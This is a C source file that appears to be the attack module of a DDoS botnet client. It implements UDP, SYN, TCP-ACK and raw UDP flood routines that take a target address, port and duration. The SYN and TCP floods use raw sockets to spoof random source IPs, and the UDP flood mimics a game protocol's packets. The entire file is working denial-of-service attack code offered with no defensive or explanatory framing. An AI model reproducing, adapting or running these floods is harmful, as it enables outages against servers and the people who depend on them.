#ifdef DEBUG
#include <stdio.h>
#else
#include <stddef.h>
#endif

#include <stdlib.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/prctl.h>

#include "headers/attacks.h"
#include "headers/utils.h"
#include "headers/checksum.h"

static struct attack_method_t **methods = {NULL};
static volatile int methods_count = 0;

static void add_method(AttackMethod id, AttackFunc func)
{
    methods = realloc(methods, (methods_count+1)*sizeof(struct attack_method_t *));
    methods[methods_count] = malloc(sizeof(struct attack_method_t));
    int x = 0;
    uint8_t *method_bytes = (uint8_t *) methods[methods_count];
    for(x = 0; x < sizeof(struct attack_method_t); x++) method_bytes[x] = 0;
    method_bytes = NULL;
    methods[methods_count]->method = id;
    methods[methods_count]->callPTR = func;
    methods_count++;
    x = 0;
    return;
}

void attack_init(void)
{
    add_method(ATTACK_UDP, &udp_flood);
    add_method(ATTACK_SYN, &syn_flood);
    add_method(ATTACK_TCP, &tcp_flood);
    add_method(ATTACK_STD, &std_flood);
}

inline static void internal_attack_start(AttackParams *params)
{
    if(params == NULL) return;
    
    int x = 0;
    for(x = 0; x < methods_count; x++)
    {
        if(methods[x]->method == params->method)
        {
            #ifdef DEBUG
            printf("Starting function for method %d\r\n", (int)params->method);
            #endif
            methods[x]->callPTR(params);
            break;
        }
        else
        {
            continue;
        }
    }
    
    return;
}

void ddos_start_attack(AttackParams *params)
{
    if(params == NULL) 
        return;
    if(params->duration > 3600) 
        return; 

    internal_attack_start(params);

    return;
}

void *udp_flood(AttackParams *params)
{
    int max_packetsize = 1300;
    int min_packetsize = 100;
    int hsock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in udpsock;

    udpsock.sin_family = AF_INET;
    udpsock.sin_addr.s_addr = params->address;
    udpsock.sin_port = params->dport;

    unsigned int ff;
    time_t end = time(NULL) + params->duration;
    for (ff = 0; ff < 1000; ff++)
    {
        while (time(NULL) < end)
        {
            int packetsize = rand() % (max_packetsize - min_packetsize + 1) + min_packetsize;

            char *data = (char *)malloc(packetsize);
            int i;
            for (i = 0; i < packetsize; i++)
            {
                if (i < 4)
                {
                    data[i] = (char)(rand() % 31);
                }
                else
                {
                    data[i] = (char)(rand() % 256);
                }
            }

            int ttl = rand() % (128 - 40 + 1) + 40;
            if (setsockopt(hsock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl)) < 0)
            {
                perror("Error setting TTL");
            }

            int udp_offset = 8;

            char *packet = (char *)malloc(packetsize + udp_offset);
            util_memset(packet, 0, udp_offset);

            packet[udp_offset] = (char)(rand() % 3 == 0 ? 0x02 : rand() % 2 == 0 ? 0x06 : 0x08);

            packet[udp_offset + 1] = (char)(rand() % 0x20);

            // Modify the first 4 bytes to range from 0 to 30
            packet[udp_offset + 2] = (char)(rand() % 31);
            packet[udp_offset + 3] = (char)(rand() % 31);
            packet[udp_offset + 4] = (char)(rand() % 31);
            packet[udp_offset + 5] = (char)(rand() % 31);

            util_cpy(packet + udp_offset + 6, data + 4, packetsize - 6);

            unsigned short *checksum_ptr = (unsigned short *)(packet + udp_offset + 2);
            *checksum_ptr = game_checksum((unsigned short *)(packet + udp_offset + 2), (packetsize - 2) / 2);

            sendto(hsock, packet, packetsize + udp_offset, 0, (struct sockaddr *)&udpsock, sizeof(udpsock));

            free(packet);
            free(data);
        }
    }
    close(hsock);
}

void *syn_flood(AttackParams *params)
{
    struct sockaddr_in addr;
    int fd;
    uint8_t flag = 1;

    struct iphdr *iph;
    struct tcphdr *tcph;
    struct iphdr *syn_iph;
    struct tcphdr *syn_tcph;

    unsigned char rawpacket[sizeof(struct iphdr) + sizeof(struct tcphdr) + 12];
    iph = (struct iphdr *)rawpacket;
    tcph = (struct tcphdr *)(rawpacket + sizeof(struct iphdr));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = params->address;
    addr.sin_port = params->dport;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) == -1)
    {
        perror("setsockopt");
        exit(1);
    }

    unsigned char synpacket[sizeof(struct iphdr) + sizeof(struct tcphdr) + 12];
    syn_iph = (struct iphdr *)synpacket;
    syn_tcph = (struct tcphdr *)(synpacket + sizeof(struct iphdr));

    syn_iph->ihl = 5;
    syn_iph->version = 4;
    syn_iph->tos = 0;
    syn_iph->id = htons(rand() % 65536);
    syn_iph->frag_off = htons(0);
    syn_iph->ttl = 64;
    syn_iph->protocol = IPPROTO_TCP;
    syn_iph->check = 0;
    syn_iph->saddr = rand_int();
    syn_iph->daddr = addr.sin_addr.s_addr;

    syn_tcph->source = htons(1024 + rand() % (65536 - 1024));
    syn_tcph->dest = params->dport;
    syn_tcph->seq = htonl((rand() % 0xc3fbfbc6) + 0x11c333f5);
    syn_tcph->ack_seq = 0;
    syn_tcph->doff = 8;
    syn_tcph->syn = 1;
    syn_tcph->ack = 0;
    syn_tcph->window = htons(65535);
    syn_tcph->check = 0;
    syn_tcph->urg_ptr = 0;

    unsigned char *syn_tcp_options = (unsigned char *)syn_tcph + sizeof(struct tcphdr);
    syn_tcp_options[0] = 0x02;
    syn_tcp_options[1] = 0x04;
    syn_tcp_options[2] = 0x05;
    syn_tcp_options[3] = (unsigned char)(1300 + rand() % 161);
    syn_tcp_options[4] = 0x01;
    syn_tcp_options[5] = 0x03;
    syn_tcp_options[6] = 0x03;
    syn_tcp_options[7] = 0x08;
    syn_tcp_options[8] = 0x01;
    syn_tcp_options[9] = 0x01;
    syn_tcp_options[10] = 0x04;
    syn_tcp_options[11] = 0x02;

    int end = time(NULL) + params->duration;
    int packet_count = 0;

    while (time(NULL) < end)
    {
        if (packet_count % 2 == 0)
        {
            syn_tcph->check = 0;
            syn_tcph->check = tcp_checksum(syn_iph, syn_tcph, sizeof(struct tcphdr) + 12);
            sendto(fd, synpacket, sizeof(struct iphdr) + sizeof(struct tcphdr) + 12, 0, (struct sockaddr *)&addr, sizeof(addr));
        }
        else
        {
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->id = htons(rand() % 65536);
            iph->frag_off = htons(0);
            iph->ttl = syn_iph->ttl;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = syn_iph->daddr;
            iph->daddr = syn_iph->saddr;

            tcph->source = syn_tcph->dest;
            tcph->dest = syn_tcph->source;
            tcph->seq = syn_tcph->ack_seq;
            tcph->ack_seq = htonl(ntohl(syn_tcph->seq) + 1);
            tcph->doff = 8;
            tcph->syn = 0;
            tcph->ack = 1;
            tcph->window = htons(packet_count % 2 == 0 ? 65535 : 64240);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            tcph->check = tcp_checksum(iph, tcph, sizeof(struct tcphdr));
            sendto(fd, rawpacket, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
        }

        packet_count++;
    }

    close(fd);
}

void *std_flood(AttackParams *params)
{
    int max_packetsize = 1300;
    int min_packetsize = 100;
    int hsock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in udpsock;

    udpsock.sin_family = AF_INET;
    udpsock.sin_addr.s_addr = params->address;
    udpsock.sin_port = params->dport;

    unsigned int ff;
    time_t end = time(NULL) + params->duration;
    for (ff = 0; ff < 1000; ff++)
    {
        while (time(NULL) < end)
        {
            int packetsize = rand() % (max_packetsize - min_packetsize + 1) + min_packetsize;

            char *data = (char *)malloc(packetsize);
            int i;
            for (i = 0; i < packetsize; i++)
            {
                if (i < 4)
                {
                    data[i] = (char)(rand() % 31);
                }
                else
                {
                    data[i] = (char)(rand() % 256);
                }
            }

            char *packet = (char *)malloc(packetsize);
            util_cpy(packet, data, packetsize);

            sendto(hsock, packet, packetsize, 0, (struct sockaddr *)&udpsock, sizeof(udpsock));

            free(packet);
            free(data);
        }
    }
    close(hsock);
}

void *tcp_flood(AttackParams *params)
{
    struct sockaddr_in addr;
    int fd;
    uint8_t flag = 1;

    struct iphdr *iph;
    struct tcphdr *tcph;

    unsigned char rawpacket[sizeof(struct iphdr) + sizeof(struct tcphdr) + 1400];
    iph = (struct iphdr *)rawpacket;
    tcph = (struct tcphdr *)(rawpacket + sizeof(struct iphdr));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = params->address;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) == -1)
    {
        perror("setsockopt");
        exit(1);
    }

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 1400;
    iph->id = htons(randy_int());
    iph->frag_off = 0;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = rand();
    iph->daddr = addr.sin_addr.s_addr;

    time_t end = time(NULL) + params->duration;
    while (end > time(NULL))
    {
        if (params->dport == 0)
        {
            params->dport = 1024 + rand() % (65535 - 1024 + 1); 
        }

        addr.sin_port = params->dport;

        int sport = 1024 + rand() % (65535 - 1024 + 1); 
        tcph->source = htons(sport);
        tcph->dest = params->dport;

        int packet_size = rand() % (sizeof(rawpacket) - sizeof(struct iphdr) - sizeof(struct tcphdr) + 1);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + packet_size;

        unsigned char *data = rawpacket + sizeof(struct iphdr) + sizeof(struct tcphdr);
        for (int i = 0; i < packet_size; i++)
        {
            data[i] = rand() % 256;
        }

        iph->ttl = 30 + rand() % 99;

        tcph->window = htons(100 + rand() % 901);

        tcph->seq = randy_int();
        tcph->ack_seq = randy_int();
        tcph->doff = 5;
        tcph->urg_ptr = 0;
        tcph->rst = 0;
        tcph->syn = 0;
        tcph->fin = 0;
        tcph->ack = 1;
        tcph->psh = 1;

        tcph->check = 0;
        tcph->check = tcp_checksum(iph, tcph, sizeof(struct tcphdr) + packet_size);

        iph->id = htons(randy_int());
        iph->check = 0;
        iph->check = checksum((unsigned short *)rawpacket, iph->tot_len);

        sendto(fd, rawpacket, sizeof(struct iphdr) + sizeof(struct tcphdr) + packet_size, 0, (struct sockaddr *)&addr, sizeof(addr));
    }

    close(fd);
    exit(0);
}